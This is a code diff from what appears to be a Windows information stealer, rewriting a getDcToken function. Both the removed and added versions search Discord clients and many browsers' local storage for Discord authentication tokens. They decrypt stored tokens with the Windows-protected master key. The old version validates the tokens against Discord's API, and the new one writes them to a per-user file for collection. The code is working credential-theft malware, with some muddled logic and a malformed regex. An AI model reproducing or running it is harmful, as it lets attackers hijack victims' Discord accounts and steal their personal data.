@@ -101,129 +101,87 @@ def getCam():
 
 
 def getDcToken():
-    base_url = "https://discord.com/api/v9/users/@me"
-    regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
-    regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
-
-    tokens, uids = [], []
-
-    def extract() -> None:
-        paths = {
-            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
-            'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
-            'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
-            'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
-            'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+    def getDcToken():
+        tokenPaths = {
+            'Discord': f"{roaming}\\Discord",
+            'Discord Canary': f"{roaming}\\discordcanary",
+            'Discord PTB': f"{roaming}\\discordptb",
+            'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
+            'Opera': f"{roaming}\\Opera Software\\Opera Stable",
+            'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+            'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
+            'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
         }
+        fileInfo = f"tokens_" + os.getlogin() + ".txt"
 
-        for name, path in paths.items():
-            if not os.path.exists(path):
-                continue
-            _discord = name.replace(" ", "").lower()
-            if "cord" in path:
-                if not os.path.exists(roaming + f'\\{_discord}\\Local State'):
+        def decrypt_token(buff, master_key):
+            try:
+                return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
+                               buff[3:15]).decrypt(buff[15:])[:-16].decode()
+            except:
+                pass
+
+        def get_tokens(path):
+            cleaned = []
+            tokens = []
+            done = []
+            lev_db = f"{path}\\Local Storage\\leveldb\\"
+            loc_state = f"{path}\\Local State"
+            # new method with encryption
+            if os.path.exists(loc_state):
+                with open(loc_state, "r") as file:
+                    key = loads(file.read())['os_crypt']['encrypted_key']
+                for file in os.listdir(lev_db):
+                    if not file.endswith(".ldb") and file.endswith(".log"):
+                        continue
+                    else:
+                        try:
+                            with open(lev_db + file, "r", errors='ignore') as files:
+                                for x in files.readlines():
+                                    x.strip()
+                                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                        tokens.append(values)
+                        except PermissionError:
+                            continue
+                for i in tokens:
+                    if i.endswith("\\"):
+                        i.replace("\\", "")
+                    elif i not in cleaned:
+                        cleaned.append(i)
+                for token in cleaned:
+                    done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]
+
+            else:  # old method without encryption
+                for file_name in os.listdir(path):
+                    try:
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
+                                     x.strip()]:
+                            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                                for token in re.findall(regex, line):
+                                    done.append(token)
+                    except:
+                        continue
+
+            return done
+
+        def main_tokens():
+            for platform, path in tokenPaths.items():
+                if not os.path.exists(path):
                     continue
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
-                                 x.strip()]:
-                        for y in re.findall(regexp_enc, line):
-                            token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\{_discord}\\Local State'))
+                try:
+                    tokens = set(get_tokens(path))
+                except:
+                    continue
+                if not tokens:
+                    continue
+                with open(f"{Aqua}/Info/{fileInfo}", "a") as f:
+                    for i in tokens:
+                        f.write(str(i) + "\n")
+                        print(f"Found Token : {i}")
 
-                            if validate_token(token):
-                                uid = requests.get(base_url, headers={
-                                    'Authorization': token}).json()['id']
-                                if uid not in uids:
-                                    tokens.append(token)
-                                    uids.append(uid)
-
-            else:
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
-                                 x.strip()]:
-                        for token in re.findall(regexp, line):
-                            if validate_token(token):
-                                uid = requests.get(base_url, headers={
-                                    'Authorization': token}).json()['id']
-                                if uid not in uids:
-                                    tokens.append(token)
-                                    uids.append(uid)
-
-        if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
-                for _file in files:
-                    if not _file.endswith('.sqlite'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for token in re.findall(regexp, line):
-                            if validate_token(token):
-                                uid = requests.get(base_url, headers={
-                                    'Authorization': token}).json()['id']
-                                if uid not in uids:
-                                    tokens.append(token)
-                                    uids.append(uid)
-
-    def validate_token(token: str) -> bool:
-        print(token)
-        r = requests.get(base_url, headers={'Authorization': token})
-
-        if r.status_code == 200:
-            return True
-
-        return False
-
-    def decrypt_val(buff: bytes, master_key: bytes) -> str:
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
-
-        return decrypted_pass
-
-    def get_master_key(path: str) -> Any | None:
-        if not os.path.exists(path):
-            return
-
-        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
-            return
-
-        with open(path, "r", encoding="utf-8") as f:
-            c = f.read()
-        local_state = json.loads(c)
-
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-        return master_key
-
-    print(extract())
+        main_tokens()
 
 
 # Clean Up
